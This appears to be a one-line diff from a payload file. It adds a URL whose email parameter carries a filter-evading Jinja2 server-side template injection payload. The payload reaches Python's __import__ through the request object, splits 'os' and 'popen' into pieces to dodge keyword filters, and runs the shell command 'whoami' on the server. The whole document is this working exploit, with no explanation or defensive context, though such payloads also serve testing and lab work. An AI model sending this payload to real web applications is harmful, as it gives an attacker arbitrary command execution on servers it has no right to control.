@@ -1,0 +1,1 @@
+http://localhost/preview_invoice?email=%22{%print(request|attr(%27application%27)|attr(%27__globals__%27)|attr(%27__getitem__%27)(%27__builtins__%27)|attr(%27__getitem__%27)(%27__import__%27)(%27o%27%27s%27)|attr(%27po%27%27pen%27)(%27whoami%27)|attr(%27read%27)())%}%22@ss
